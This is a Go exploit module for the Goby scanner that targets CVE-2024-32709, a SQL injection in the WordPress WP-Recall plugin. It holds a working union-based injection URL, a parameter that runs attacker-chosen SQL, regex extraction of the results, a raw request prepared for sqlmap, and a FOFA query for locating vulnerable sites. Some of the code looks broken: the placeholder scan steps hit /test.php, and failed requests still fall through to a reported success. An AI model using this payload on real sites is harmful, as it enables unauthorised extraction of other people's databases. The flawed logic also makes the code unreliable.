package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "WordPress Recall  /account/ SQL Injection Vulnerability(CVE-2024-32709)",
    "Description": "<p>WordPress is a free and open source content management system (CMS) that started out as a blogging platform, but has since evolved into a powerful website building tool for all types of websites, including personal blogs, corporate websites, e-commerce websites, and gradually evolved into a content management system software.</p><p>Its plug-in, WP-Recall, has an SQL injection vulnerability in its plug-in account, which allows attackers to obtain sensitive database information.</p>",
    "Product": "WordPress",
    "Homepage": "http://www.wordpress.com/",
    "DisclosureDate": "2024-04-24",
    "PostTime": "2024-07-19",
    "Author": "1215816861@qq.com",
    "FofaQuery": "body=\"/wp-content/plugins/wp-recall/\" && body=\"assets\"",
    "GobyQuery": "body=\"/wp-content/plugins/wp-recall/\" && body=\"assets\"",
    "Level": "2",
    "Impact": "<p>Its plug-in, WP-Recall, has an SQL injection vulnerability in its plug-in account, which allows attackers to obtain sensitive database information.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update intime:<a href=\"http://www.wordpress.com/\">http://www.wordpress.com/</a></p>",
    "References": [
        "http://10.10.10.112/zentao/task-view-10354.html?tid=77ip1i3w"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "md5(12345)",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2024-32709"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "WordPress插件Recall  /account/ SQL 注入漏洞(CVE-2024-32709)",
            "Product": "AUTOMATTIC-WordPress",
            "Description": "<p>WordPress是一款免费开源的内容管理系统(CMS)，最初是一个博客平台，但后来发展成为一个功能强大的网站建设工具，适用于各种类型的网站，包括个人博客、企业网站、电子商务网站等，并逐步演化成一款内容管理系统软件。</p><p>其插件WP-Recall其插件存在account存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。<br></p>",
            "Recommendation": "<p>官方已更新补丁，请升级至最新版本。官网地址：<a href=\"https://wordpress.com/zh-cn/\">https://wordpress.com/zh-cn/</a><br></p>",
            "Impact": "<p>插件WP-Recall其插件存在account存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "WordPress Recall  /account/ SQL Injection Vulnerability(CVE-2024-32709)",
            "Product": "WordPress",
            "Description": "<p>WordPress is a free and open source content management system (CMS) that started out as a blogging platform, but has since evolved into a powerful website building tool for all types of websites, including personal blogs, corporate websites, e-commerce websites, and gradually evolved into a content management system software.</p><p>Its plug-in, WP-Recall, has an SQL injection vulnerability in its plug-in account, which allows attackers to obtain sensitive database information.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update intime:<a href=\"http://www.wordpress.com/\">http://www.wordpress.com/</a><br></p>",
            "Impact": "<p>Its plug-in, WP-Recall, has an SQL injection vulnerability in its plug-in account, which allows attackers to obtain sensitive database information.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10972"
}`

	setSqlPayloadHash_AfsdfeA1718ds6102012 := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		urlget := `/account/?user=1&tab=groups&group-name=p%27+or+%27%%27=%27%%27+union+all+select+1,2,3,4,5,6,7,8,9,10,11,concat(%22Database%20:%22,` + sql + `,0x7e),13--+-`
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Content-Type":    "application/x-www-form-urlencoded",
		}
		resp, err = setGetRequest(hostInfo, urlget, header)
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = `/account/?user=1&tab=groups&group-name=p%27+or+%27%%27=%27%%27+union+all+select+1,2,3,4,5,6,7,8,9,10,11,concat(%22Database%20:%22,` + sql + `,0x7e),13--+-`

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "827ccb0eea8a706c4c34a16891f84e7b"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `md5(12345)`

			sendPayload := setSqlPayloadHash_AfsdfeA1718ds6102012
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.RawBody, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /account/?user=1&tab=groups&group-name=p%27+or+%27%%27=%27%%27+union+all+select+1,2,3,4,5,6,7,8,9,10,11,concat(%22Database:%22,md5(123456),0x7c),13--+- HTTP/1.1\n Host: " + expResult.HostInfo.FixedHostInfo + "\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\nAccept-Encoding: gzip, deflate, br\nConnection: close"

			// 3.配置正则语句，从响应包中提取出数据
			regular := `Database :(.*?)~`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHash_AfsdfeA1718ds6102012
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" || attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
